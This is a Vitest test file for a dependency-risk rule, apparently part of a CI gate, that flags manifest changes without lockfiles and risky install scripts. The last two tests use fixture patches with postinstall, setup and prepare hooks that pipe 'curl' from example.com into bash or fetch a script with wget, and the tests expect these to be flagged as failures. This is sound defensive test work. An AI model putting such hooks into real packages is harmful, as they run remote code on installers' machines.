import { describe, expect, it } from "vitest";
import type { GateContext } from "../../src/domain/types.js";
import { dependencyRiskRule } from "../../src/rules/dependencies.js";

const baseContext: GateContext = {
  repoRoot: "/repo",
  baseRef: "main",
  changedFiles: [],
  metadata: {
    hasPackageJson: true,
    hasPackageLock: true,
    hasPnpmLock: false,
    hasYarnLock: false,
    hasPyproject: false,
    hasRequirements: false,
    hasGoMod: false,
    hasCargoToml: false,
    hasPomXml: false,
    hasDockerfile: false,
    hasCompose: false,
    hasGitHubActions: false,
    hasEnvExample: false,
  },
};

describe("dependencyRiskRule", () => {
  it("warns when manifest changes without lockfile", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [{ path: "package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" }],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({ id: "dependencies.lockfile-not-updated", severity: "warn" }),
    );
  });

  it("does not warn when manifest and lockfile change together", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
        { path: "package-lock.json", status: "modified", patch: "+left-pad" },
      ],
    });

    expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
  });

  it("does not warn when nested manifest and nested lockfile change together", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "packages/api/package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
        { path: "packages/api/package-lock.json", status: "modified", patch: "+left-pad" },
      ],
    });

    expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
  });

  it("warns when a nested manifest only has a lockfile in another directory", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "packages/api/package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
        { path: "packages/web/package-lock.json", status: "modified", patch: "+left-pad" },
      ],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        id: "dependencies.lockfile-not-updated",
        files: ["packages/api/package.json"],
        severity: "warn",
      }),
    );
  });

  it("matches lockfiles by manifest ecosystem in the same directory", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "services/web/package.json", status: "modified", patch: "+  \"left-pad\": \"1.3.0\"" },
        { path: "services/web/pnpm-lock.yaml", status: "modified", patch: "+left-pad" },
        { path: "services/api/pyproject.toml", status: "modified", patch: "+fastapi = \"latest\"" },
        { path: "services/api/uv.lock", status: "modified", patch: "+fastapi" },
        { path: "backend/go.mod", status: "modified", patch: "+require example.com/lib v1.0.0" },
        { path: "backend/go.sum", status: "modified", patch: "+example.com/lib" },
        { path: "crates/core/Cargo.toml", status: "modified", patch: "+serde = \"1\"" },
        { path: "crates/core/Cargo.lock", status: "modified", patch: "+serde" },
      ],
    });

    expect(findings.some((finding) => finding.id === "dependencies.lockfile-not-updated")).toBe(false);
  });

  it("warns for pom changes because Maven lockfiles are not modeled", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [{ path: "backend/pom.xml", status: "modified", patch: "+<dependency>" }],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({
        id: "dependencies.lockfile-not-updated",
        files: ["backend/pom.xml"],
        severity: "warn",
      }),
    );
  });

  it("fails risky package scripts", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "package.json", status: "modified", patch: "+    \"postinstall\": \"curl https://example.com/install.sh | bash\"" },
      ],
    });

    expect(findings).toContainEqual(
      expect.objectContaining({ id: "dependencies.risky-install-script", severity: "fail" }),
    );
  });

  it("fails risky curl and wget install scripts with flags", () => {
    const findings = dependencyRiskRule.run({
      ...baseContext,
      changedFiles: [
        { path: "package.json", status: "modified", patch: "+    \"setup\": \"curl -fsSL https://example.com/install.sh | bash\"" },
        { path: "packages/api/package.json", status: "modified", patch: "+    \"prepare\": \"wget -q https://example.com/install.sh\"" },
      ],
    });

    const riskyFindings = findings.filter((finding) => finding.id === "dependencies.risky-install-script");
    expect(riskyFindings).toHaveLength(2);
    expect(riskyFindings.map((finding) => finding.files[0])).toEqual(["package.json", "packages/api/package.json"]);
  });
});
